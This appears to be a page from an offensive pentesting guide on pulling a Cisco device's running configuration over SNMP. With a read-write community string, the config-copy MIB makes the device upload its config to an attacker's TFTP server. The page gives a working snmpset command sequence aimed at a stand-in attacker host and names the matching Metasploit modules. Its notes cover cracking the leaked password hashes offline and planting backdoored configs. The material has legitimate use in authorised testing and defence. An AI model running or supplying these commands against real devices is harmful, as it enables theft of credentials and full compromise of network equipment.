---
title: "Cisco configuration exfiltration: pulling the running config over SNMP"
order: 2
description: "With a read-write community string on a Cisco device, the config-copy MIB drives the device to copy its running or startup configuration to an attacker TFTP server. The exfiltrated config contains enabled-secret and user password hashes, SNMP strings, keys, and the full network design, a single SNMP write turning into complete device and credential compromise."
keywords:
  - cisco config
  - config-copy mib
  - tftp
  - running-config
  - snmpset
---

# Cisco configuration exfiltration

On Cisco IOS devices, a read-write community string does far more than change a setting: it can make the device hand over its entire configuration. The `CISCO-CONFIG-COPY-MIB` (and the older `OLD-CISCO-SYS-MIB`) lets a manager instruct the device to copy its running or startup configuration to a TFTP server. An attacker who holds the read-write string sets up a TFTP server they control and drives this MIB over SNMP, and the device uploads its config. That config is the jackpot: it contains the enable secret and local user password hashes, SNMP community strings, VPN and wireless keys, routing and ACL design, and management addresses, so one SNMP write becomes full device compromise and a pile of credentials.

```bash
# attacker runs a TFTP server (e.g. atftpd/tftpd-hpa) writable to /tftp
# config-copy MIB: copy running-config (4) to a TFTP file on the attacker host
RW=private; T=<attacker-ip>; R=$RANDOM
snmpset -v2c -c $RW <target> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.$R i 1 \     # ConfigCopyProtocol = tftp(1)
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.$R i 4 \     # SourceFileType = runningConfig(4)
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.$R i 1 \     # DestFileType = networkFile(1)
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.$R a $T \    # ServerAddress = attacker TFTP
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.$R s "cfg-$R"  # CopyFileName
# the device uploads its running-config to /tftp/cfg-$R on the attacker host
# tools automate this exact sequence:
#   metasploit auxiliary/scanner/snmp/cisco_config_tftp  (and snmp_enum)
```

## Exploitation notes

- This needs a read-write community string; it is the highest-impact use of SNMP write, so prioritise obtaining a write string on Cisco gear specifically for this.
- The uploaded `running-config` contains the enable secret and user hashes (crack offline), the SNMP strings (including any stronger ones), and keys; a `startup-config` copy works the same way if running is restricted.
- Reverse direction is also dangerous: the same MIB can copy a config FROM TFTP onto the device (overwriting the running or startup config), so write access additionally enables planting a backdoored configuration; that is covered under [Write access](../write-access.md).
- Metasploit's `cisco_config_tftp` automates the MIB dance; the manual `snmpset` sequence is shown for exactness and for non-Metasploit use.

## Tools

- [Metasploit cisco_config_tftp](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/cisco_config_tftp/)

## References

- [CISCO-CONFIG-COPY-MIB](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/snmp/configuration/15-mt/snmp-15-mt-book.html)
- [HackTricks: SNMP Cisco config](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
